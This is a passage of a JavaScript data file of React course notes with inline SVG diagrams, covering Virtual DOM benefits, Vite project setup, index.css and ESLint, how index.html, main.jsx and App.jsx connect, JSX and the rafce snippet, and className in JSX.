                    <text x="200" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">INSTAGRAM NOTIFICATION EXAMPLE</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title">Granular Badge Increment</text>

                    <!-- Badge Node (Only updated part) -->
                    <rect x="25" y="70" width="350" height="42" rx="6" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="200" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">💬 Badge: [ 4 ] → [ 5 ] (Patched in 2ms)</text>

                    <!-- Feed Node (Untouched) -->
                    <rect x="25" y="122" width="350" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="200" y="142" text-anchor="middle" class="svg-mono-xs">Photo Feed, Stories & Sidebar 100% Intact</text>
                    <text x="200" y="158" text-anchor="middle" class="svg-sub">Zero page flicker · zero redundant requests</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "7.4",
          title: "Key Architectural Benefits of the Virtual DOM",
          content: `
            <div class="sub-card-grid-3">
              <div class="sub-box">
                <div class="sub-box__tag">Benefit 01 · Browser</div>
                <div class="sub-box__title">Less Browser Load</div>
                <div class="sub-box__body">
                  The browser eliminates redundant layout recalculations and repaints. Only the nodes whose state truly mutated get touched in the live DOM.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Benefit 02 · Device</div>
                <div class="sub-box__title">Less System & CPU Overhead</div>
                <div class="sub-box__body">
                  Computing differences in JavaScript object graphs takes almost zero CPU cycles compared to C++ browser layout tree calculations, saving battery life.
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Benefit 03 · UX</div>
                <div class="sub-box__title">Faster, Smoother Apps</div>
                <div class="sub-box__body">
                  Even as your application grows to hundreds of complex interactive components, UI updates feel snappy, instantaneous, and butter-smooth at 60 frames per second.
                </div>
              </div>
            </div>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 08: CREATING & RUNNING A REACT APP WITH VITE
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-08-vite-setup",
      number: "08",
      shortLabel: "Vite Setup & Tooling",
      title: "Creating & Running a React App with Vite",
      summary: "Step-by-step Vite setup commands (npm create vite, cd, npm i, npm run dev), port 5173 dev server, index.css cleanup, and ESLint static code quality guardrails.",
      subtopicLabels: ["8.1 Vite Setup Commands", "8.2 index.css Reset & ESLint"],
      diagramCount: 2,
      sections: [
        {
          num: "8.1",
          title: "Step-by-Step Vite Setup Commands",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Why Vite Instead of Create-React-App (CRA)?</strong>
                <ul class="notes-sub-list">
                  <li>Legacy tooling like CRA bundles your entire codebase with Webpack before serving, resulting in sluggish cold starts and slow reloads as apps grow.</li>
                  <li><strong>Vite</strong> leverages native browser <strong>ES Modules (ESM)</strong> and the ultra-fast Go-based compiler <strong>esbuild</strong> to start development servers in milliseconds with instantaneous <strong>Hot Module Replacement (HMR)</strong>.</li>
                </ul>
              </li>
              <li><strong>The 4 Essential Setup Commands:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Step 1 · Initialize the Project:</strong> Run <code>npm create vite</code> in your terminal. When prompted, enter your project directory name, select <strong>React</strong> as your framework, and select <strong>JavaScript</strong> as your language variant.</li>
                  <li><strong>Step 2 · Navigate into Folder:</strong> Run <code>cd &lt;your-project-name&gt;</code> to change your terminal working directory into the newly scaffolded project.</li>
                  <li><strong>Step 3 · Install Dependencies:</strong> Run <code>npm i</code> (shorthand for <code>npm install</code>). This reads <code>package.json</code> and downloads React, ReactDOM, and dev dependencies into the local <code>node_modules/</code> folder.</li>
                  <li><strong>Step 4 · Start Development Server:</strong> Run <code>npm run dev</code>. Vite compiles your code on demand and launches a live local server—typically accessible at <strong>http://localhost:5173</strong>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 8.1 · Next-Gen Vite Build Toolchain & Terminal Execution Pipeline</span>
                <span class="diagram-frame-tag">DEV TOOLING & LOCAL RUNTIME</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing the 4 terminal commands to create and run a React app with Vite on localhost:5173">
                  <!-- Step 1: npm create vite -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="190" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2" />
                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">01</text>
                    <text x="65" y="30" class="svg-kicker" style="fill:var(--primary); font-weight:700;">SCAFFOLD</text>
                    <text x="95" y="62" text-anchor="middle" class="svg-title">npm create vite</text>
                    <rect x="15" y="76" width="160" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="95" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent);">Select: React</text>
                    <text x="95" y="112" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">Variant: JavaScript</text>
                  </g>

                  <!-- Arrow 1 -> 2 -->
                  <g transform="translate(217, 90)">
                    <line x1="0" y1="10" x2="22" y2="10" stroke="var(--primary)" stroke-width="2" stroke-dasharray="3 3"/>
                    <polygon points="22,6 30,10 22,14" fill="var(--primary)"/>
                  </g>

                  <!-- Step 2: cd <dir> -->
                  <g transform="translate(249, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--border)" />
                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">02</text>
                    <text x="65" y="30" class="svg-kicker" style="font-weight:700;">NAVIGATE</text>
                    <text x="90" y="62" text-anchor="middle" class="svg-title">cd app-name</text>
                    <rect x="15" y="76" width="150" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="90" y="96" text-anchor="middle" class="svg-mono-xs">Switch Directory</text>
                    <text x="90" y="112" text-anchor="middle" class="svg-sub">Enter project root</text>
                  </g>

                  <!-- Arrow 2 -> 3 -->
                  <g transform="translate(431, 90)">
                    <line x1="0" y1="10" x2="22" y2="10" stroke="var(--primary)" stroke-width="2" stroke-dasharray="3 3"/>
                    <polygon points="22,6 30,10 22,14" fill="var(--primary)"/>
                  </g>

                  <!-- Step 3: npm i -->
                  <g transform="translate(463, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2" />
                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">03</text>
                    <text x="65" y="30" class="svg-kicker" style="fill:var(--accent); font-weight:700;">DEPENDENCIES</text>
                    <text x="90" y="62" text-anchor="middle" class="svg-title">npm i</text>
                    <rect x="15" y="76" width="150" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="90" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent);">node_modules/</text>
                    <text x="90" y="112" text-anchor="middle" class="svg-sub">react & react-dom</text>
                  </g>

                  <!-- Arrow 3 -> 4 -->
                  <g transform="translate(645, 90)">
                    <line x1="0" y1="10" x2="22" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="22,6 30,10 22,14" fill="var(--success)"/>
                  </g>

                  <!-- Step 4: npm run dev -->
                  <g transform="translate(677, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2" />
                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">04</text>
                    <text x="65" y="30" class="svg-kicker" style="fill:var(--success); font-weight:700;">LIVE SERVER</text>
                    <text x="90" y="62" text-anchor="middle" class="svg-title" style="fill:var(--success);">npm run dev</text>
                    <rect x="15" y="76" width="150" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="90" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">localhost:5173</text>
                    <text x="90" y="112" text-anchor="middle" class="svg-sub">Instant HMR Active</text>
                  </g>

                  <!-- Footer note inside diagram -->
                  <text x="440" y="205" text-anchor="middle" class="svg-sub" style="letter-spacing:1px; fill:var(--text-muted);">
                    NATIVE ES MODULES SERVING · SUB-MILLISECOND HOT MODULE REPLACEMENT · ZERO BUNDLE LATENCY
                  </text>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "8.2",
          title: "Cleaning Up Default Styles (index.css) & ESLint",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Resetting <code>index.css</code> for a Clean Canvas:</strong>
                <ul class="notes-sub-list">
                  <li>By default, Vite injects starter CSS styling (centered logos, default padding, button animations) inside <code>src/index.css</code>, which is imported inside <code>src/main.jsx</code>.</li>
                  <li>To prevent unwanted style conflicts, clear out default boilerplate inside <code>index.css</code> and establish your clean base styles:
                    <pre class="notes-code-block"><code>/* src/index.css */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  background-color: #111;
  color: #fff;
  font-family: system-ui, -apple-system, sans-serif;
}</code></pre>
                  </li>
                  <li>Since <code>main.jsx</code> imports <code>index.css</code>, these global rules automatically propagate to every component rendered inside the root element.</li>
                </ul>
              </li>
              <li><strong>What Is ESLint & Why Does It Matter?</strong>
                <ul class="notes-sub-list">
                  <li><strong>ESLint</strong> is a static code analysis tool that parses your JavaScript/JSX code to catch syntax bugs, unused imports, and anti-patterns before runtime.</li>
                  <li>Vite includes ESLint by default via <code>eslint.config.js</code>.</li>
                  <li><strong>Common Linter Warning:</strong> If you write <code>import React from 'react'</code> at the top of a modern component without calling any React method directly, ESLint displays a warning: <code>'React' is defined but never used (no-unused-vars)</code>. Since React 17's new JSX transform automatically handles compilation behind the scenes, explicit React imports are no longer necessary unless using hooks or React APIs.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 8.2 · ESLint Static Code Analysis & Developer Feedback Loop</span>
                <span class="diagram-frame-tag">STATIC ANALYSIS & CODE HYGIENE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing ESLint inspecting JSX code for unused variables and warnings">
                  <!-- Source Code Box -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="240" height="160" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker">DEVELOPER CODE</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title">src/App.jsx</text>
                    <rect x="15" y="66" width="210" height="80" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs" style="fill:var(--danger);">import React from 'react';</text>
                    <text x="25" y="108" class="svg-mono-xs" style="fill:var(--text);">function App() {</text>
                    <text x="35" y="128" class="svg-mono-xs" style="fill:var(--primary);">&lt;h1&gt;Hello World&lt;/h1&gt;</text>
                  </g>

                  <!-- Arrow 1 -> 2 -->
                  <g transform="translate(275, 95)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--primary)"/>
                    <text x="22" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">AST Parse</text>
                  </g>

                  <!-- ESLint Engine Box -->
                  <g transform="translate(325, 25)">
                    <rect x="0" y="0" width="230" height="160" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">STATIC ANALYSIS ENGINE</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title">ESLint Rules Evaluator</text>
                    <rect x="15" y="66" width="200" height="80" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="88" class="svg-mono-xs">✓ Detects Syntax Errors</text>
                    <text x="25" y="108" class="svg-mono-xs">✓ Enforces Hooks Rules</text>
                    <text x="25" y="128" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">⚠ Flags Unused Imports</text>
                  </g>

                  <!-- Arrow 2 -> 3 -->
                  <g transform="translate(560, 95)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--accent)"/>
                    <text x="22" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--accent);">Terminal Log</text>
                  </g>

                  <!-- Dev Terminal Warning Box -->
                  <g transform="translate(605, 25)">
                    <rect x="0" y="0" width="245" height="160" rx="10" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="122" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">DEV FEEDBACK</text>
                    <text x="122" y="52" text-anchor="middle" class="svg-title">VS Code / Terminal</text>
                    <rect x="15" y="66" width="215" height="80" rx="6" fill="var(--danger-bg)" stroke="var(--danger)"/>
                    <text x="25" y="88" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">⚠ Warning (no-unused-vars):</text>
                    <text x="25" y="108" class="svg-mono-xs" style="fill:var(--danger);">'React' is defined but</text>
                    <text x="25" y="126" class="svg-mono-xs" style="fill:var(--danger);">never used in App.jsx</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 09: HOW A REACT VITE APP WORKS UNDER THE HOOD
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-09-how-vite-react-works",
      number: "09",
      shortLabel: "Vite Bootstrap Architecture",
      title: "How a React Vite App Works Under the Hood (index.html → main.jsx → App.jsx)",
      summary: "Single HTML entry point, createRoot DOM mounting, the 3-generation Family Tree analogy (Grandparent, Parent, Child), JSX compilation, and the rafce shortcut.",
      subtopicLabels: ["9.1 Core File Roles", "9.2 Family Tree Analogy", "9.3 JSX & rafce Shortcut"],
      diagramCount: 2,
      sections: [
        {
          num: "9.1",
          title: "Role of Each Core File",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Even with modern modular architecture, everything reaches the browser through a single HTML document:</strong></li>
              <li><strong>1. <code>index.html</code> (Single Page Entry Point):</strong>
                <ul class="notes-sub-list">
                  <li>Contains a single empty mounting container: <code>&lt;div id="root"&gt;&lt;/div&gt;</code>.</li>
                  <li>Loads your application code via an ES module script: <code>&lt;script type="module" src="/src/main.jsx"&gt;&lt;/script&gt;</code>.</li>
                  <li>All React UI is dynamically rendered into this <code>#root</code> div.</li>
                </ul>
              </li>
              <li><strong>2. <code>src/main.jsx</code> (The Mounting Bridge):</strong>
                <ul class="notes-sub-list">
                  <li>Selects the container using <code>document.getElementById('root')</code>.</li>
                  <li>Initializes the React DOM rendering engine via <code>createRoot(...)</code> and mounts your root component with <code>.render(&lt;App /&gt;)</code>.</li>
                  <li>Imports global styles via <code>import './index.css'</code>.</li>
                  <li>Wraps <code>&lt;App /&gt;</code> in <code>&lt;StrictMode&gt;</code> during development to perform dual-render integrity checks.</li>
                </ul>
              </li>
              <li><strong>3. <code>src/App.jsx</code> (Root Component):</strong>
                <ul class="notes-sub-list">
                  <li>A JavaScript function returning UI markup via <strong>JSX</strong> (e.g. <code>return &lt;h1&gt;Hello Guys&lt;/h1&gt;</code>).</li>
                  <li>Whatever JSX is returned from <code>App.jsx</code> is converted into Virtual DOM nodes and injected into <code>#root</code>.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "9.2",
          title: "The Family Tree Analogy (How the Three Files Connect)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>To remember the exact connection hierarchy, think of the three files as three family generations:</strong>
                <ul class="notes-sub-list">
                  <li><strong><code>index.html</code> = Grandparent (Dadaji):</strong> Owns the physical real estate (the browser HTML document) and provides the empty foundation container <code>&lt;div id="root"&gt;</code>.</li>
                  <li><strong><code>main.jsx</code> = Parent / Father (Papa):</strong> The coordinator. It takes the child (<code>App.jsx</code>) and physically places it inside Dadaji's foundation (<code>#root</code>) using <code>createRoot().render()</code>.</li>
                  <li><strong><code>App.jsx</code> = Child (Baccha):</strong> Creates and returns the actual visual content (headings, buttons, cards, forms).</li>
                </ul>
              </li>
              <li><strong>Browser Inspect Verification:</strong>
                <ul class="notes-sub-list">
                  <li>Open any React Vite app in Google Chrome or Firefox, right-click, and select <strong>Inspect</strong>.</li>
                  <li>Inside <code>&lt;body&gt;</code>, you will see <code>&lt;div id="root"&gt;</code>, and sitting directly inside it is the exact HTML generated by <code>App.jsx</code>!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 9.1 · The Three Generations Bootstrap Architecture (Dadaji → Papa → Baccha)</span>
                <span class="diagram-frame-tag">BOOTSTRAP HIERARCHY & MOUNTING</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 250" class="arch-svg" role="img" aria-label="Diagram showing the 3 generations: index.html (Dadaji) hosting main.jsx (Papa) which mounts App.jsx (Baccha) into div id=root">
                  <!-- Grandparent: index.html -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="250" height="195" rx="12" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="108" height="22" rx="4" fill="var(--border)"/>
                    <text x="69" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">GRANDPARENT</text>
                    <text x="125" y="62" text-anchor="middle" class="svg-title">index.html (Dadaji)</text>
                    <text x="125" y="80" text-anchor="middle" class="svg-sub">Physical DOM Foundation</text>

                    <rect x="15" y="95" width="220" height="50" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="116" text-anchor="middle" class="svg-mono-xs" style="font-weight:700; fill:var(--primary);">&lt;div id="root"&gt;&lt;/div&gt;</text>
                    <text x="125" y="134" text-anchor="middle" class="svg-sub">Target mounting container</text>

                    <rect x="15" y="152" width="220" height="30" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="172" text-anchor="middle" class="svg-mono-xs" style="font-size:10.5px; fill:var(--text-primary); font-weight:600;">&lt;script src="/src/main.jsx"&gt;&lt;/script&gt;</text>
                  </g>

                  <!-- Connect 1 -> 2 -->
                  <g transform="translate(280, 110)">
                    <line x1="0" y1="10" x2="30" y2="10" stroke="var(--primary)" stroke-width="2.5"/>
                    <polygon points="30,5 40,10 30,15" fill="var(--primary)"/>
                    <text x="20" y="-2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">Loads</text>
                  </g>

                  <!-- Parent: main.jsx -->
                  <g transform="translate(325, 25)">
                    <rect x="0" y="0" width="260" height="195" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="2"/>
                    <rect x="15" y="15" width="71" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="50.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">PARENT</text>
                    <text x="130" y="62" text-anchor="middle" class="svg-title">main.jsx (Papa)</text>
                    <text x="130" y="80" text-anchor="middle" class="svg-sub">Mounting & Root Engine</text>

                    <rect x="15" y="95" width="230" height="85" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--text-muted);">const root = document...</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">createRoot(root)</text>
                    <text x="35" y="158" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">.render(&lt;App /&gt;)</text>
                  </g>

                  <!-- Connect 2 -> 3 -->
                  <g transform="translate(590, 110)">
                    <line x1="0" y1="10" x2="30" y2="10" stroke="var(--accent)" stroke-width="2.5"/>
                    <polygon points="30,5 40,10 30,15" fill="var(--accent)"/>
                    <text x="20" y="-2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--accent);">Mounts</text>
                  </g>

                  <!-- Child: App.jsx -->
                  <g transform="translate(635, 25)">
                    <rect x="0" y="0" width="220" height="195" rx="12" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="2"/>
                    <rect x="15" y="15" width="63" height="22" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
                    <text x="46.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">CHILD</text>
                    <text x="110" y="62" text-anchor="middle" class="svg-title">App.jsx (Baccha)</text>
                    <text x="110" y="80" text-anchor="middle" class="svg-sub">UI Markup & Content</text>

                    <rect x="15" y="95" width="190" height="85" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="118" class="svg-mono-xs">function App() {</text>
                    <text x="35" y="138" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">return &lt;h1&gt;Hello&lt;/h1&gt;</text>
                    <text x="25" y="158" class="svg-mono-xs">}</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "9.3",
          title: "JSX Basics, &lt;App /&gt; vs. App(), &amp; the rafce Shortcut",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>What Is JSX (JavaScript XML)?</strong>
                <ul class="notes-sub-list">
                  <li>JSX is a syntax extension for JavaScript that allows you to write HTML-like tags directly inside JavaScript functions.</li>
                  <li>JSX is not native browser JavaScript; build tools like Vite (via Babel or esbuild) compile JSX tags into standard <code>React.createElement(...)</code> function calls.</li>
                </ul>
              </li>
              <li><strong>Calling Components: <code>&lt;App /&gt;</code> vs. <code>App()</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Under the hood, a React component is simply a <strong>JavaScript function</strong>.</li>
                  <li>Inside <code>main.jsx</code>, calling <code>App()</code> is a standard JavaScript function call, while writing <strong><code>&lt;App /&gt;</code></strong> is the <strong>JSX syntax</strong> to invoke the component function with React lifecycle management and hooks support.</li>
                </ul>
              </li>
              <li><strong>Boilerplate Shortcut (<code>rafce</code>):</strong>
                <ul class="notes-sub-list">
                  <li>Instead of typing out arrow functions, export statements, and return blocks manually in VS Code, install the <em>ES7+ React/Redux/React-Native snippets</em> extension.</li>
                  <li>Type <strong><code>rafce</code></strong> and press <strong>Enter</strong> to instantly generate a complete <strong>React Arrow Function Component with Export</strong>:
                    <pre class="notes-code-block"><code>import React from 'react'

const App = () => {
  return (
    &lt;div&gt;App&lt;/div&gt;
  )
}

export default App</code></pre>
                  </li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 9.2 · JSX Compilation Pipeline: From JSX Tag to DOM Node</span>
                <span class="diagram-frame-tag">COMPILATION & RUNTIME EVALUATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Diagram showing JSX code being compiled to React.createElement and rendered to live DOM">
                  <!-- Step 1: JSX Tag -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="90" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">1 · JSX TAG</text>
                    <text x="90" y="52" text-anchor="middle" class="svg-title">Developer Code</text>
                    <rect x="15" y="66" width="150" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="90" y="106" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">&lt;App /&gt;</text>
                  </g>

                  <!-- Arrow 1 -> 2 -->
                  <g transform="translate(215, 90)">
                    <line x1="0" y1="10" x2="25" y2="10" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="25,6 33,10 25,14" fill="var(--primary)"/>
                    <text x="16" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">Compile</text>
                  </g>

                  <!-- Step 2: Transpiled JS -->
                  <g transform="translate(253, 25)">
                    <rect x="0" y="0" width="200" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="100" y="28" text-anchor="middle" class="svg-kicker">2 · COMPILER OUTPUT</text>
                    <text x="100" y="52" text-anchor="middle" class="svg-title">React.createElement</text>
                    <rect x="15" y="66" width="170" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="100" y="98" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">React.createElement(</text>
                    <text x="100" y="116" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--accent);">App, null)</text>
                  </g>

                  <!-- Arrow 2 -> 3 -->
                  <g transform="translate(458, 90)">
                    <line x1="0" y1="10" x2="25" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="25,6 33,10 25,14" fill="var(--accent)"/>
                    <text x="16" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--accent);">Execute</text>
                  </g>

                  <!-- Step 3: Virtual DOM Node -->
                  <g transform="translate(496, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="90" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">3 · VIRTUAL DOM</text>
                    <text x="90" y="52" text-anchor="middle" class="svg-title">JS Object Tree</text>
                    <rect x="15" y="66" width="150" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="90" y="96" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">{ type: 'div',</text>
                    <text x="90" y="114" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--accent);">props: {...} }</text>
                  </g>

                  <!-- Arrow 3 -> 4 -->
                  <g transform="translate(681, 90)">
                    <line x1="0" y1="10" x2="25" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="25,6 33,10 25,14" fill="var(--success)"/>
                    <text x="16" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Mount</text>
                  </g>

                  <!-- Step 4: Real DOM -->
                  <g transform="translate(719, 25)">
                    <rect x="0" y="0" width="140" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="70" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">4 · REAL DOM</text>
                    <text x="70" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">#root Node</text>
                    <rect x="12" y="66" width="116" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="70" y="106" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Live HTML</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 10: COMPONENT-BASED ARCHITECTURE & CLASSNAME IN JSX
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-10-component-architecture-classname",
      number: "10",
      shortLabel: "Component Architecture & JSX",
      title: "Component-Based Architecture & className in JSX",
      summary: "Why className is used over class, why App.jsx must stay clean, avoiding copy-paste anti-patterns, and sheryians.com component breakdown with isolated rendering.",
      subtopicLabels: ["10.1 className vs class", "10.2 Clean App.jsx & Anti-Patterns", "10.3 Component Architecture"],
      diagramCount: 2,
      sections: [
        {
          num: "10.1",
          title: "Using className Instead of class in JSX",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Reserved Keyword Collision:</strong>
                <ul class="notes-sub-list">
                  <li>In traditional HTML, you assign CSS styling classes with <code>class="card"</code>.</li>
                  <li>In JSX, you <strong>cannot</strong> write <code>class="card"</code>; you must write <strong><code>className="card"</code></strong>.</li>
                  <li><strong>Why?</strong> In JavaScript, <code>class</code> is a reserved keyword used to define ES6 classes (e.g. <code>class Car {}</code>). Because JSX compiles directly into JavaScript object representations, using <code>class</code> as an attribute name causes lexical naming collisions.</li>
                </ul>
              </li>
              <li><strong>What About the <code>id</code> Attribute?</strong>
                <ul class="notes-sub-list">
                  <li><code>id</code> is <strong>not</strong> a reserved keyword in JavaScript.</li>
                  <li>Therefore, <code>id="header"</code> or <code>id="root"</code> remains completely unchanged in JSX—only <code>class</code> is written as <code>className</code>.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "10.2",
          title: "Why We Keep App.jsx Clean (The Copy-Paste Problem)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Copy-Paste Anti-Pattern:</strong>
                <ul class="notes-sub-list">
                  <li>Suppose you build a card element directly inside <code>App.jsx</code>:
                    <pre class="notes-code-block"><code>function App() {
  return (
    &lt;div&gt;
      &lt;div className="card" style={{ background: 'pink', borderRadius: 10, padding: 20 }}&gt;
        &lt;h2&gt;Sarthak Sharma&lt;/h2&gt;
        &lt;p&gt;Lorem ipsum dolor sit amet consectetur adipisicing.&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  );
}</code></pre>
                  </li>
